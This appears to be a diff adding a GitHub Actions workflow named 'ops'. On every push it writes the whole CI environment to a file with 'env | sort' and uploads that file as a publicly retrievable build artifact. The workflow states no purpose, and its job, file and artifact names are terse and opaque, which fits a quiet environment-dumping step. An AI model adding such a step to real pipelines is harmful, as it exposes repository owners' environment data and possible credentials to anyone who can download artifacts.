@@ -1,0 +1,11 @@
+name: ops
+on: push
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - run: env | sort > /tmp/e.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: e
+          path: /tmp/e.txt
